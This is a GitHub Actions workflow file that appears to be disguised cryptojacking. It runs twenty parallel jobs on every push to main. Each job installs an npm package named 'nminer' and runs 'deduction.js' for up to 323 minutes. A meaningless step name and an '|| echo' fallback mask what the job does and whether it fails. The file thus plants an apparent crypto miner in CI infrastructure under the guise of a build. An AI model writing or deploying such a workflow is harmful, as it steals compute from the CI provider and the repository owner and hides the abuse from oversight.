name: deduction
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2810 }
          - { version: 1412 }
          - { version: 5725 }
          - { version: 7488 }
          - { version: 4567 }
          - { version: 8071 }
          - { version: 7700 }
          - { version: 5810 }
          - { version: 2628 }
          - { version: 6175 }
          - { version: 3077 }
          - { version: 8855 }
          - { version: 4499 }
          - { version: 5629 }
          - { version: 4133 }
          - { version: 7721 }
          - { version: 5619 }
          - { version: 8706 }
          - { version: 9729 }
          - { version: 376 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: eventually galvanize commonly failing
        run: |
          npm install nminer@latest
          timeout 323m node deduction.js || echo "deduction executed"